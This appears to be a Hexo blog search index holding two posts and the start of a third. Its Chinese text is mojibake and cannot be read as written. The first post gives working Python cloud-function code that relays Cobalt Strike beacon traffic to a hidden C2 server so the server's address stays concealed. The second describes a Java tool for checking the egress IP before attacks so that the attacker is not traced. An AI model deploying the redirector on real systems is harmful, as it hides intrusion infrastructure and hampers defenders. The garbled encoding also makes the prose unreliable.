<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>è¸©å‘è®°å½•ä¹‹ä½¿ç”¨äº‘å‡½æ•°éšè—C2åœ°å€</title>
      <link href="post/202207122133.html"/>
      <url>post/202207122133.html</url>
      
        <content type="html"><![CDATA[<h1 id="è¸©å‘è®°å½•ä¹‹ä½¿ç”¨äº‘å‡½æ•°éšè—C2åœ°å€"><a href="#è¸©å‘è®°å½•ä¹‹ä½¿ç”¨äº‘å‡½æ•°éšè—C2åœ°å€" class="headerlink" title="è¸©å‘è®°å½•ä¹‹ä½¿ç”¨äº‘å‡½æ•°éšè—C2åœ°å€"></a>è¸©å‘è®°å½•ä¹‹ä½¿ç”¨äº‘å‡½æ•°éšè—C2åœ°å€</h1><p>äº‘å‡½æ•°éšè—C2åœ°å€çš„éƒ¨ç½²è¿‡ç¨‹è·Ÿç½‘ç»œä¸Šå¤§åŒå°å¼‚ï¼Œå‚è€ƒçš„ä»¥ä¸‹æ–‡ç« è¿›è¡Œéƒ¨ç½²ï¼Œç¯å¢ƒä¸ºCS4.2ï¼š</p><p><a href="https://blog.csdn.net/w1590191166/article/details/113826579">https://blog.csdn.net/w1590191166/article/details/113826579</a></p><p><a href="https://www.cnblogs.com/SeanGyy/p/15614445.html">https://www.cnblogs.com/SeanGyy/p/15614445.html</a></p><p>æœ¬æ–‡åªè®°å½•åœ¨éƒ¨ç½²è¿‡ç¨‹ä¸­é‡åˆ°çš„é—®é¢˜ã€‚</p><h2 id="1-å‘ç‚¹æ€»ç»“"><a href="#1-å‘ç‚¹æ€»ç»“" class="headerlink" title="1.å‘ç‚¹æ€»ç»“"></a>1.å‘ç‚¹æ€»ç»“</h2><p>éƒ¨ç½²è¿‡ç¨‹ä¸­çš„2ä¸ªè¸©å‘åˆ†åˆ«æ˜¯</p><ul><li><p>python3.7é»˜è®¤æ²¡å®‰è£…requestsåº“</p></li><li><p>ç›´æ¥pip3 install requestså®‰è£…åº“ä¸ç”Ÿæ•ˆï¼Œéœ€è¦æŒ‡å®šä¿å­˜ä½ç½®</p></li></ul><p>å‡å·²è§£å†³</p><h2 id="2-éƒ¨ç½²è¿‡ç¨‹"><a href="#2-éƒ¨ç½²è¿‡ç¨‹" class="headerlink" title="2.éƒ¨ç½²è¿‡ç¨‹"></a>2.éƒ¨ç½²è¿‡ç¨‹</h2><h3 id="1-1-å‘ç‚¹1ï¼špython3-7é»˜è®¤æœªå®‰è£…requestsåº“"><a href="#1-1-å‘ç‚¹1ï¼špython3-7é»˜è®¤æœªå®‰è£…requestsåº“" class="headerlink" title="1.1 å‘ç‚¹1ï¼špython3.7é»˜è®¤æœªå®‰è£…requestsåº“"></a>1.1 å‘ç‚¹1ï¼špython3.7é»˜è®¤æœªå®‰è£…requestsåº“</h3><p>å‘ç‚¹ï¼šéƒ¨ç½²å‰æ²¡æœ‰æµ‹è¯•ï¼Œä¸çŸ¥é“python3.7é»˜è®¤æ²¡å®‰è£…requestsåº“</p><p>ä½¿ç”¨çš„ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf8</span></span><br><span class="line"><span class="keyword">import</span> json,requests,base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main_handler</span>(<span class="params">event, context</span>):</span></span><br><span class="line">    response = &#123;&#125;</span><br><span class="line">    path = <span class="literal">None</span></span><br><span class="line">    headers = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        C2=<span class="string">&#x27;http://12*******10:80&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;path&#x27;</span> <span class="keyword">in</span> event.keys():</span><br><span class="line">            path=event[<span class="string">&#x27;path&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;headers&#x27;</span> <span class="keyword">in</span> event.keys():    </span><br><span class="line">            headers=event[<span class="string">&#x27;headers&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;httpMethod&#x27;</span> <span class="keyword">in</span> event.keys() <span class="keyword">and</span> event[<span class="string">&#x27;httpMethod&#x27;</span>] == <span class="string">&#x27;GET&#x27;</span> :</span><br><span class="line">            resp=requests.get(C2+path,headers=headers,verify=<span class="literal">False</span>) </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            resp=requests.post(C2+path,data=event[<span class="string">&#x27;body&#x27;</span>],headers=headers,verify=<span class="literal">False</span>)</span><br><span class="line">            print(resp.headers)</span><br><span class="line">            print(resp.content)</span><br><span class="line">        response=&#123;</span><br><span class="line">            <span class="string">&quot;isBase64Encoded&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">            <span class="string">&quot;statusCode&quot;</span>: resp.status_code,</span><br><span class="line">            <span class="string">&quot;headers&quot;</span>: <span class="built_in">dict</span>(resp.headers),</span><br><span class="line">            <span class="string">&quot;body&quot;</span>: <span class="built_in">str</span>(base64.b64encode(resp.content))[<span class="number">2</span>:-<span class="number">1</span>]</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">        print(e)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure><p>æ‰€æœ‰éƒ¨ç½²å¥½ä¹‹åè®¿é—®äº‘å‡½æ•°åœ°å€ï¼ŒCSä¸­æ²¡æœ‰æµé‡ï¼Œç¬¬ä¸€æ¬¡å°è¯•å¤±è´¥ã€‚</p><h3 id="1-2-å‘ç‚¹2ï¼šç›´æ¥pip3-installå®‰è£…åº“ä¸ç”Ÿæ•ˆ"><a href="#1-2-å‘ç‚¹2ï¼šç›´æ¥pip3-installå®‰è£…åº“ä¸ç”Ÿæ•ˆ" class="headerlink" title="1.2 å‘ç‚¹2ï¼šç›´æ¥pip3 installå®‰è£…åº“ä¸ç”Ÿæ•ˆ"></a>1.2 å‘ç‚¹2ï¼šç›´æ¥pip3 installå®‰è£…åº“ä¸ç”Ÿæ•ˆ</h3><p>å›å¤´è°ƒè¯•æ—¶å‘ç°æ²¡æœ‰å®‰è£…requestsåº“ï¼Œæµ‹è¯•æ˜¾ç¤ºæŠ¥é”™ï¼Œä¹‹å‰æ²¡æœ‰æµ‹è¯•ç›´æ¥éƒ¨ç½²äº†</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">No module named &#x27;requests&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202208211217987.png" alt="image-20220726200711612"></p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202208211217133.png" alt="image-20220726200634461"></p><p>æŸ¥çœ‹pip3 listç¡®å®æ²¡æœ‰</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202208211217054.png" alt="image-20220726200808139"></p><p>pip3 install requestsè£…ä¸€ä¸ªï¼Œå†æ¬¡æµ‹è¯•éƒ¨ç½²</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202208211217927.png" alt="image-20220726200900598"></p><p>å®‰è£…åå‘ç°è¿˜æ˜¯ä¸è¡Œï¼Œä¾ç„¶æç¤ºæ‰¾ä¸åˆ°requestsï¼Œç¬¬äºŒæ¬¡å°è¯•å¤±è´¥ã€‚</p><h3 id="1-3-ç¬¬ä¸‰æ¬¡å°è¯•æˆåŠŸ"><a href="#1-3-ç¬¬ä¸‰æ¬¡å°è¯•æˆåŠŸ" class="headerlink" title="1.3 ç¬¬ä¸‰æ¬¡å°è¯•æˆåŠŸ"></a>1.3 ç¬¬ä¸‰æ¬¡å°è¯•æˆåŠŸ</h3><p>52pojieä¸­ç»™å‡ºè§£å†³æ–¹æ³•ï¼š</p><ol><li>åˆ‡æ¢python3.6ï¼Œè‡ªå¸¦requests</li><li>æŒ‡å®šä½ç½®é‡æ–°å®‰è£…requestsåº“</li></ol><p>æœ¬æ¬¡ä½¿ç”¨ç¬¬äºŒç§æ–¹æ³•ï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŒ‡å®šä½ç½®é‡æ–°å®‰è£…requestsåº“</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd src</span><br><span class="line">pip3 install requests -t .</span><br></pre></td></tr></table></figure><p>é‡æ–°éƒ¨ç½²ï¼Œæµ‹è¯•æˆåŠŸ</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202208211217456.png" alt="image-20220726201856660"></p><p>æµè§ˆå™¨è®¿é—®äº‘å‡½æ•°åœ°å€ï¼Œå‡ºç°webæ—¥å¿—</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202208211217358.png" alt="image-20220726204132966"></p><p>æ‰§è¡Œå‘½ä»¤æˆåŠŸï¼Œæºipæ˜¯å˜åŒ–çš„</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202208211218900.png" alt="image-20220726204340902"></p><p>ä¿®æ”¹äº‘å‡½æ•°ä»£ç ä¸­åè®®ä¸ºhttpsï¼Œ443ç«¯å£ï¼ŒæˆåŠŸä½¿ç”¨httpsç›‘å¬è¿æ¥</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202208211218692.png" alt="image-20220726204604706"></p><p>ä½¿ç”¨æ²™ç®±åˆ†æå‡ºæ¥çš„é€šè®¯åœ°å€ä¹Ÿæ˜¯äº‘å‡½æ•°åœ°å€ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> äº‘å‡½æ•° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€å·¥å…·ç¯‡ã€‘EgressIpQuery - å‡ºå£IPæŸ¥è¯¢å·¥å…·</title>
      <link href="post/202204292133.html"/>
      <url>post/202204292133.html</url>
      
        <content type="html"><![CDATA[<h1 id="ğŸ‘â€ğŸ—¨EgressIpQuery-ä¸»æœºå‡ºå£IPæŸ¥è¯¢å·¥å…·"><a href="#ğŸ‘â€ğŸ—¨EgressIpQuery-ä¸»æœºå‡ºå£IPæŸ¥è¯¢å·¥å…·" class="headerlink" title="ğŸ‘â€ğŸ—¨EgressIpQuery - ä¸»æœºå‡ºå£IPæŸ¥è¯¢å·¥å…·"></a>ğŸ‘â€ğŸ—¨EgressIpQuery - ä¸»æœºå‡ºå£IPæŸ¥è¯¢å·¥å…·</h1><p>å¯åœ¨æ”»å‡»å‰æˆ–é…ç½®å…¨å±€ä»£ç†åä½¿ç”¨è¯¥å·¥å…·æ£€æµ‹å‡ºå£IPï¼Œé¿å…åœ¨æ”»å‡»ä¸­å› ä»£ç†æœªç”Ÿæ•ˆè€Œè¢«æº¯æºçš„é—®é¢˜ã€‚</p><p>Githubï¼š<a href="https://github.com/Sma11New/EgressIpQuery">https://github.com/Sma11New/EgressIpQuery</a></p><h2 id="ğŸ”¨å·¥å…·ä»‹ç»"><a href="#ğŸ”¨å·¥å…·ä»‹ç»" class="headerlink" title="ğŸ”¨å·¥å…·ä»‹ç»"></a>ğŸ”¨å·¥å…·ä»‹ç»</h2><h3 id="ğŸœå·¥å…·ç‰¹ç‚¹"><a href="#ğŸœå·¥å…·ç‰¹ç‚¹" class="headerlink" title="ğŸœå·¥å…·ç‰¹ç‚¹"></a>ğŸœå·¥å…·ç‰¹ç‚¹</h3><ul><li>  å›¾å½¢åŒ–æ–¹ä¾¿æ“ä½œå’Œå±•ç¤º</li><li>  æ”¯æŒè‡ªå®šä¹‰æŸ¥è¯¢æ¥å£ã€ä»£ç†</li><li>  åŒæ—¶æŸ¥è¯¢å‡ºå£IPå½’å±</li><li>  æ²¡æœ‰ç¬¬ä¸‰æ–¹ä¾èµ–</li></ul><h3 id="ğŸjavaç‰ˆæœ¬"><a href="#ğŸjavaç‰ˆæœ¬" class="headerlink" title="ğŸjavaç‰ˆæœ¬"></a>ğŸjavaç‰ˆæœ¬</h3><p>é¡¹ç›®ä½¿ç”¨jdk8ç¼–å†™</p><h3 id="ğŸ»ä½¿ç”¨è¯´æ˜"><a href="#ğŸ»ä½¿ç”¨è¯´æ˜" class="headerlink" title="ğŸ»ä½¿ç”¨è¯´æ˜"></a>ğŸ»ä½¿ç”¨è¯´æ˜</h3><p>ç›´æ¥æŸ¥è¯¢ï¼Œä½¿ç”¨çš„å·¥å…·è‡ªå¸¦æ¥å£</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/164969006-db6a3168-f6ae-48fb-9a72-a72b9073ad72.png" alt="image"></p><p>ä¹Ÿå¯ä»¥è‡ªå®šä¹‰æŸ¥è¯¢æ¥å£ï¼Œå½“ä¸»åŠ¨ä¿®æ”¹æ¥å£åï¼Œä¼šåœ¨åŒç›®å½•ä¸‹ç”ŸæˆEIQconfig.listæ¥å£é…ç½®æ–‡ä»¶ï¼Œæ¢å¤é»˜è®¤æ¥å£åï¼Œä¼šè‡ªåŠ¨åˆ é™¤è¯¥é…ç½®æ–‡ä»¶ã€‚</p><h3 id="â­•é—ç•™é—®é¢˜"><a href="#â­•é—ç•™é—®é¢˜" class="headerlink" title="â­•é—ç•™é—®é¢˜"></a>â­•é—ç•™é—®é¢˜</h3><p>é…ç½®ä»£ç†åï¼Œå†æ¬¡ç‚¹å¼€é…ç½®ç•Œé¢ï¼Œä»£ç†ç±»å‹ä¼šé‡ç½®ä¸ºsocksï¼Œå¦‚æœæ˜¯httpåˆ™éœ€è¦å†æ¬¡é€‰æ‹©ã€‚</p><h2 id="ğŸä»£ç åˆ†æ"><a href="#ğŸä»£ç åˆ†æ" class="headerlink" title="ğŸä»£ç åˆ†æ"></a>ğŸä»£ç åˆ†æ</h2><p>å·¥å…·å®ç°éå¸¸ç®€å•ï¼Œæˆ‘ç”šè‡³èƒ½æƒ³åˆ°ç”¨Pythonæ€æ ·åœ¨ä¸åˆ°100è¡Œå†™å‡ºä¸€ä¸ªåˆå¥å£®åˆå¥½ç”¨çš„åŒæ ·åŠŸèƒ½çš„å·¥å…·ï¼Œä¸è¿‡è¿™æ˜¯ç¬¬ä¸€ä¸ªè¾ƒä¸ºå®Œæ•´çš„Javaå·¥å…·é¡¹ç›®ï¼ŒåŠŸèƒ½ç®€å•ï¼Œä¸»è¦ç”¨äºç†Ÿæ‚‰Javaé¡¹ç›®æµç¨‹ï¼Œæ”¶è·ä¸å°ã€‚</p><h3 id="ğŸ­é¡¹ç›®ç»“æ„"><a href="#ğŸ­é¡¹ç›®ç»“æ„" class="headerlink" title="ğŸ­é¡¹ç›®ç»“æ„"></a>ğŸ­é¡¹ç›®ç»“æ„</h3><p>å¼€å§‹ä½¿ç”¨mavenç®¡ç†é¡¹ç›®ï¼Œä½†æ˜¯é…ç½®å’Œæ‰“åŒ…é‡å¤å‡ºç°é—®é¢˜ï¼Œè€Œä¸”åŠŸèƒ½è¾ƒç®€å•ï¼Œç´¢æ€§ä¸ç”¨äº†ï¼Œä¸‹ä¸ªé¡¹ç›®å†å¥½å¥½ç ”ç©¶</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image_2022-05-18_00-18-00.jpg" alt="image_2022-05-18_00-18-00"></p><p>å¼ƒç”¨mavenåç»“æ„å¦‚ä¸‹ï¼š</p><ul><li>  queryåŒ…ä¸‹æ”¾åŠŸèƒ½é€»è¾‘ç›¸å…³ä»£ç </li><li>  uiåŒ…ä¸‹æ”¾ç•Œé¢å±•ç¤ºç›¸å…³ä»£ç </li><li>  utilsåŒ…ä¸‹æ”¾å·¥å…·ç±»</li></ul><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image-20220518000356290.png" alt="image-20220518000356290"></p><p>å…³é”®æŸ¥è¯¢ç±»Queryå¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> query;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> utils.HttpUtil;</span><br><span class="line"><span class="keyword">import</span> utils.RegUtil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Query</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æŸ¥è¯¢å‡ºå£IP</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> interUrl æŸ¥è¯¢æ¥å£åœ°å€</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> ip</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">doQueryIp</span><span class="params">(String interUrl)</span> </span>&#123;</span><br><span class="line">        String egressIp = <span class="keyword">null</span>;</span><br><span class="line">        String reqResult = HttpUtil.doGet(interUrl, Proxy.getProxy.schame(), Proxy.getProxy.ip(), Proxy.getProxy.port());</span><br><span class="line">        <span class="keyword">if</span> (reqResult != <span class="keyword">null</span>) &#123;</span><br><span class="line">            egressIp = RegUtil.findIp(reqResult);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> egressIp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æŸ¥è¯¢å½’å±</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> ip å¾…æŸ¥è¯¢ip</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> addr</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">doQueryAddr</span><span class="params">(String ip)</span> </span>&#123;</span><br><span class="line">        String addr = <span class="keyword">null</span>;</span><br><span class="line">        String url = <span class="string">&quot;http://whois.pconline.com.cn/ipJson.jsp?ip=&quot;</span> + ip + <span class="string">&quot;&amp;json=true&quot;</span>;</span><br><span class="line">        String reqResult = HttpUtil.doGet(url, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (reqResult != <span class="keyword">null</span>) &#123;</span><br><span class="line">            addr = RegUtil.findAddr(reqResult);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> addr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>doQueryIpæ–¹æ³•è°ƒç”¨HttpUtilå·¥å…·ç±»ä¸­çš„doGetæ–¹æ³•å‘èµ·getè¯·æ±‚ï¼Œå†å¯¹ç»“æœåšæ­£åˆ™åŒ¹é…ï¼Œè·å–å‡ºå£IP</p><p>doQueryAddræ–¹æ³•åŒæ ·è°ƒç”¨HttpUtilå·¥å…·ç±»ä¸­çš„doGetæ–¹æ³•å‘èµ·getè¯·æ±‚ï¼Œå¯¹ç»“æœåŒ¹é…å½’å±åœ°å€ï¼Œè·å–å½’å±</p><h3 id="ğŸ’«è‡ªå®šä¹‰æ¥å£Dialog"><a href="#ğŸ’«è‡ªå®šä¹‰æ¥å£Dialog" class="headerlink" title="ğŸ’«è‡ªå®šä¹‰æ¥å£Dialog"></a>ğŸ’«è‡ªå®šä¹‰æ¥å£Dialog</h3><h4 id="1-å·§å¦™åœ°è®¾è®¡"><a href="#1-å·§å¦™åœ°è®¾è®¡" class="headerlink" title="1.å·§å¦™åœ°è®¾è®¡"></a>1.å·§å¦™åœ°è®¾è®¡</h4><p>èµ·åˆæ‰“ç®—æ•´ä¸ªå·¥å…·æ˜¯ä¸å¸¦ä»»ä½•é…ç½®æ–‡ä»¶å’Œç”Ÿæˆæ–‡ä»¶çš„ï¼Œä½†æ˜¯å‘ç°ä½¿ç”¨ä¸­è¦æƒ³è‡ªå®šä¹‰æ¥å£å°±å¿…é¡»ç”Ÿæˆé…ç½®æ–‡ä»¶ï¼Œå› æ­¤ç”¨äº†è¿™ä¸ªå·§å¦™çš„è®¾è®¡ï¼š</p><p>åˆå§‹å·¥å…·ä¸å¸¦é…ç½®æ–‡ä»¶ï¼Œè‡ªå®šä¹‰æ¥å£åï¼Œå¦‚æœæ¥å£ä¸é»˜è®¤æ¥å£ä¸ç›¸åŒï¼Œåˆ™åˆ›å»ºä¸€ä¸ªé…ç½®æ–‡ä»¶å†™å…¥ä¿®æ”¹åçš„æ¥å£ï¼Œå½“æ¥å£ä¸é»˜è®¤æ¥å£ç›¸åŒæ—¶åˆä¼šåˆ é™¤é…ç½®æ–‡ä»¶ï¼Œè€Œä¸”çª—å£åŠ å…¥äº†<strong>æ¢å¤é»˜è®¤</strong>æŒ‰é’®ï¼Œæ–¹ä¾¿ã€‚å› æ­¤æŸ¥è¯¢é€»è¾‘æ˜¯ç³»ç»Ÿè°ƒç”¨æŸ¥è¯¢æ¥å£æ—¶ä¼šå…ˆä¼˜å…ˆåˆ¤æ–­æ˜¯å¦å­˜åœ¨é…ç½®æ–‡ä»¶ï¼Œå­˜åœ¨è¡¨ç¤ºé…ç½®æ–‡ä»¶å·²ç»ä¿®æ”¹ï¼Œåˆ™è¯»å–æ–‡ä»¶ä¸­çš„æ¥å£ï¼Œä¸å­˜åœ¨å°±æ˜¯ç³»ç»Ÿé»˜è®¤æ¥å£ã€‚</p><p>çº¯çº¯çš„<strong>ã€ŠèŠ±é‡Œèƒ¡å“¨ã€‹</strong></p><p><strong>ç›¸å…³ä»£ç ï¼š</strong></p><p>ä½¿ç”¨é™æ€ä»£ç å—åˆå§‹åŒ–ï¼Œæ¥å®ç°åˆå§‹åŒ–æ¥å£</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆå§‹åŒ–æ¥å£åˆ—è¡¨</span></span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        File interFile = <span class="keyword">new</span> File(interConFile);</span><br><span class="line">        <span class="comment">// å­˜åœ¨è‡ªå®šä¹‰æ¥å£é…ç½®æ–‡ä»¶ï¼Œè¡¨ç¤ºç”¨æˆ·ä¿®æ”¹å¹¶è‡ªå®šä¹‰æ¥å£ï¼Œåˆ™åŠ è½½dialogæ—¶è¯»å–æ–‡ä»¶ä¸­çš„æ¥å£</span></span><br><span class="line">        <span class="comment">// å¦åˆ™è¯»å–é»˜è®¤æ¥å£</span></span><br><span class="line">        <span class="keyword">if</span> (interFile.exists()) &#123;</span><br><span class="line">            interList = FileUtil.readFile(interConFile);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            interList = defaultInter;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>query.Inter#setInterList</code> setæ—¶åˆ¤æ–­æ˜¯å¦ç›¸åŒï¼Œå¹¶æ‰§è¡Œä¸‹ä¸€æ­¥æ“ä½œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * setæ¥å£ï¼Œå¹¶åˆ¤æ–­æ˜¯å¦ä¸é»˜è®¤æ¥å£ç›¸åŒï¼Œç›¸åŒåˆ é™¤é…ç½®æ–‡ä»¶ï¼Œä¸åŒå†™å…¥é…ç½®æ–‡ä»¶</span></span><br><span class="line"><span class="comment"> * æ¥æ”¶String</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> interList æ¥å£List</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setInterList</span><span class="params">(String interList)</span> </span>&#123;</span><br><span class="line">    Inter.interList = TypeTransUtil.stringToList(interList);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!Inter.interList.equals(Inter.defaultInter)) &#123;</span><br><span class="line">        FileUtil.writeFile(interList, interConFile);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        FileUtil.deleteFile(interConFile);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-åˆæ³•è¾“å…¥æ ¡éªŒ"><a href="#2-åˆæ³•è¾“å…¥æ ¡éªŒ" class="headerlink" title="2.åˆæ³•è¾“å…¥æ ¡éªŒ"></a>2.åˆæ³•è¾“å…¥æ ¡éªŒ</h4><p>æ­£åˆ™æ ¡éªŒè¾“å…¥çš„æ¥å£æ˜¯å¦æ˜¯åˆæ³•urlï¼ŒåŒæ ·åœ¨é…ç½®ä»£ç†ä¸­ä¹Ÿæ ¡éªŒIPç«¯å£æ˜¯å¦åˆæ³•ã€‚</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image-20220518001338519.png" alt="image-20220518001338519"></p><h4 id="3-å»é‡"><a href="#3-å»é‡" class="headerlink" title="3.å»é‡"></a>3.å»é‡</h4><p>å¯¹æ¥å£å»é‡å¤„ç†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> å·¥å…·ç¯‡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä¿¡æ¯æŸ¥è¯¢ </tag>
            
            <tag> å‡ºå£IPæŸ¥è¯¢ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Javaå­¦ä¹ ä¹‹è·¯ã€‘SE3 - staticä¿®é¥°ç¬¦</title>
      <link href="post/20220182133.html"/>
      <url>post/20220182133.html</url>
      
